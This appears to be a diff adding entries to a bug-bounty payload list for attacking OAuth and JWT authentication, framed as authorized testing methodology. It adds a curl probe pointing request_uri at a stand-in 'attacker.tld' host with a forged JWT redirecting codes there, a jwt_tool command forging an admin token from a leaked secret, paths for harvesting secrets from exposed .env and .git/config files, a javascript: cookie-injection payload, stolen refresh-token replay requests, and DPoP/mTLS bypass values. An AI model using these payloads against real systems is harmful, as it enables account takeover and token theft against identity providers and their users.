@@ -66,3 +66,38 @@ admin
 
 # --- Unverified JWKS rotation ---
 # If server caches JWKS by kid and trusts new kid, register new kid with your public key
+
+# ============================================================================
+# 2024-2026 Bug Bounty Additions (see methodology/bounty_patterns_2024_2026.md)
+# ============================================================================
+
+# --- P2: request_uri JAR bypass (CVE-2024-10318 family) ---
+# Test IdP endpoints that accept JAR / request_uri with attacker-hosted JWT.
+# IdP must (but often doesn't) validate the JWT signature + aud + iss + registered client_id.
+# Curl probe:
+# curl -s "https://idp.target/authorize?client_id=X&request_uri=https://attacker.tld/jar.jwt"
+# JWT payload hosted at attacker-controlled request_uri:
+{"iss":"attacker","aud":"idp","client_id":"victim","redirect_uri":"https://attacker.tld/cb","response_type":"code","scope":"openid profile email","nonce":"FIXED","state":"ATTACKER"}
+# Signing variants to try against the IdP:
+# - alg:none (P2 + alg:none compound)
+# - HS256 with leaked static secret
+# - RS256 with attacker JWKS hosted at request_uri host
+
+# --- P3: .env-leaked JWT_SECRET forging recipe ---
+# After finding /.env, /.env.example, /.env.bak, /.git/config, /config.php.bak, etc.
+# extract JWT_SECRET / SECRET_KEY / JWT_PRIVATE_KEY and forge:
+# jwt_tool -S hs256 -p "$LEAKED_SECRET" -I -pc role -pv admin -pc sub -pv 1 "$EXISTING_JWT"
+# Combine with open-redirect sink to deliver forged cookie cross-origin:
+# https://target.tld/login/callback?next=javascript:document.cookie='jwt='+FORGED
+
+# --- P4: refresh-token silent-persistence probes ---
+# After capturing a refresh token, run each probe in order:
+# 1) Replay RT after user password reset — should fail; if succeeds → finding.
+# 2) Replay RT after user "sign out everywhere" — should fail; if succeeds → finding.
+# 3) Replay same RT ≥10 times in a row — should rotate; no rotation → finding.
+# 4) Replay RT from a different IP/UA — should be detected; silent success → finding.
+# Canonical POST body:
+# grant_type=refresh_token&refresh_token=$STOLEN_RT&client_id=$CID[&client_secret=$CSEC]
+# Additional keys to test for DPoP / mTLS sender-constraint bypass:
+{"DPoP":"<forged-dpop-jwt>"}
+{"cnf":{"jkt":"<any-thumbprint>"}}
